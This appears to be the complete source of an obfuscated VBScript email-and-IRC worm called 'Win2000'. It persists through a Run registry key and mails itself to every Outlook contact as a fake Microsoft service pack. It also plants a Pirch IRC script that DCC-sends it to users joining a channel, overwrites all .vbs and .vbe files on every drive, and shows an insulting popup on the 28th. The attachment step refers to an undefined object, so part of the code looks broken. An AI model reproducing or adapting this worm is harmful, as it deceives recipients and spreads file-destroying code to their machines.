'Win2000 Created By Pingu2000
On Error Resume Next
Set ajquvaljxyp= Createobject("scripting.filesystemobject")
ajquvaljxyp.copyfile wscript.scriptfullname,ajquvaljxyp.GetSpecialFolder(1)& "\Win2000.vbs"
Set sbgaqoonqim = CreateObject("WScript.Shell")
sbgaqoonqim.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Win2000","wscript.exe "&ajquvaljxyp.GetSpecialFolder(1)& "\Win2000.vbs %"
if sbgaqoonqim.regread ("HKCU\software\Win2000\mailed") <> "1" then
pxlksnplxmb()
end if
if sbgaqoonqim.regread ("HKCU\software\Win2000\pirched") <> "1" then
arlvrmtyqpj ""
end if
jxbhvfvhqwq()
Function pxlksnplxmb()
On Error Resume Next
Set plvtfwcfdjr = CreateObject("Outlook.Application")
If plvtfwcfdjr= "Outlook"Then
Set scdiukzhxak=plvtfwcfdjr.GetNameSpace("MAPI")
For Each oiywwvyqnqg In scdiukzhxak.AddressLists
If oiywwvyqnqg.AddressEntries.Count <> 0 Then
tezubgyyrky = oiywwvyqnqg.AddressEntries.Count
For tmuwxtfujbz= 1 To tezubgyyrky
Set jpxnwpreyxu = plvtfwcfdjr.CreateItem(0)
Set dbnyknlrsal = oiywwvyqnqg.AddressEntries(tmuwxtfujbz)
jpxnwpreyxu.To = dbnyknlrsal.Address
jpxnwpreyxu.Subject = "Win2000 Service Pack 2"
jpxnwpreyxu.Body = "Service Pack 2 has released from Microsoft" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "By Pingu2000" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "any Greets to Coderz.net"
lqvshpyispk.Add ajquvaljxyp.GetSpecialFolder(1)& "\Win2000.vbs"
jpxnwpreyxu.DeleteAfterSubmit = True
If jpxnwpreyxu.To <> "" Then
jpxnwpreyxu.Send
sbgaqoonqim.regwrite "HKCU\software\Win2000\mailed", "1"
End If
Next
End If
Next
end if
End Function
function arlvrmtyqpj(aeeegzvzouu)
On Error Resume Next
if aeeegzvzouu="" then
if ajquvaljxyp.fileexists("c:\pirch\Pirch32.exe") then aeeegzvzouu="c:\pirch"
if ajquvaljxyp.fileexists("c:\pirch32\Pirch32.exe") then aeeegzvzouu="c:\pirch32"
cefbovrkacm=sbgaqoonqim.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if ajquvaljxyp.fileexists(cefbovrkacm & "\pirch\Pirch32.exe") then aeeegzvzouu=cefbovrkacm & "\pirch\Pirch32.exe"
end if
if aeeegzvzouu <> "" then
set acjpzgztgrr= ajquvaljxyp.CreateTextFile(aeeegzvzouu & "\events.ini", True)
acjpzgztgrr.WriteLine "[Levels]"
acjpzgztgrr.WriteLine "Enabled=1"
acjpzgztgrr.WriteLine "Count=6"
acjpzgztgrr.WriteLine "Level1=000-Unknowns"
acjpzgztgrr.WriteLine "000-UnknownsEnabled=1"
acjpzgztgrr.WriteLine "Level2=100-Level 100"
acjpzgztgrr.WriteLine "100-Level 100Enabled=1"
acjpzgztgrr.WriteLine "Level3=200-Level 200"
acjpzgztgrr.WriteLine "200-Level 200Enabled=1"
acjpzgztgrr.WriteLine "Level4=300-Level 300"
acjpzgztgrr.WriteLine " 300-Level 300Enabled=1"
acjpzgztgrr.WriteLine "Level5=400-Level 400 "
acjpzgztgrr.WriteLine "400-Level 400Enabled=1"
acjpzgztgrr.WriteLine "Level6=500-Level 500"
acjpzgztgrr.WriteLine "500-Level 500Enabled=1"
acjpzgztgrr.WriteLine ""
acjpzgztgrr.WriteLine "[000-Unknowns]"
acjpzgztgrr.WriteLine "UserCount=0"
acjpzgztgrr.WriteLine "EventCount=0"
acjpzgztgrr.WriteLine ""
acjpzgztgrr.WriteLine "[100-Level 100]"
acjpzgztgrr.WriteLine "User1=*!*@*"
acjpzgztgrr.WriteLine "UserCount=1"
acjpzgztgrr.writeline "Event1=ON JOIN:#:/dcc tsend $nick " & ajquvaljxyp.GetSpecialFolder(1) & "\Win2000.vbs"
acjpzgztgrr.WriteLine "EventCount=1"
acjpzgztgrr.WriteLine ""
acjpzgztgrr.WriteLine "[200-Level 200]"
acjpzgztgrr.WriteLine "UserCount=0"
acjpzgztgrr.WriteLine "EventCount=0"
acjpzgztgrr.WriteLine ""
acjpzgztgrr.WriteLine "[300-Level 300]"
acjpzgztgrr.WriteLine "UserCount=0"
acjpzgztgrr.WriteLine "EventCount=0"
acjpzgztgrr.WriteLine ""
acjpzgztgrr.WriteLine "[400-Level 400]"
acjpzgztgrr.WriteLine "UserCount=0"
acjpzgztgrr.WriteLine "EventCount=0"
acjpzgztgrr.WriteLine ""
acjpzgztgrr.WriteLine "[500-Level 500]"
acjpzgztgrr.WriteLine "UserCount=0"
acjpzgztgrr.WriteLine "EventCount=0"
acjpzgztgrr.close
sbgaqoonqim.regwrite "HKCU\software\Win2000\pirched", "1"
end if
end function
if day(now) = 28 then
msgbox "you are stupid !!!",64
end if
Function jxbhvfvhqwq()
On Error Resume Next
Set firkmzmspyw = ajquvaljxyp.Drives
For Each itfbzfnvfze In firkmzmspyw
If itfbzfnvfze.Drivetype = Remote Then
qncdtdgkfvz= itfbzfnvfze & "\"
Call zzbnqujppxz(qncdtdgkfvz)
ElseIf itfbzfnvfze.IsReady Then
qncdtdgkfvz= itfbzfnvfze&"\"
Call zzbnqujppxz(qncdtdgkfvz)
End If
Next
End Function
Function zzbnqujppxz(awjqmevxhvx)
Set edubnobfmak= ajquvaljxyp.GetFolder(awjqmevxhvx)
Set zluhuaxgyjb= edubnobfmak.Files
For Each gjhnwdhimyv In zluhuaxgyjb
if ajquvaljxyp.GetExtensionName(gjhnwdhimyv.path) = "vbs" then
ajquvaljxyp.copyfile wscript.scriptfullname , gjhnwdhimyv.path , true
end if
if ajquvaljxyp.GetExtensionName(gjhnwdhimyv.path) = "vbe" then
ajquvaljxyp.copyfile wscript.scriptfullname , gjhnwdhimyv.path , true
end if
Next
Set gjhnwdhimyv= edubnobfmak.SubFolders
For Each klbfosndaba In gjhnwdhimyv
Call zzbnqujppxz(klbfosndaba.path)
Next
End Function
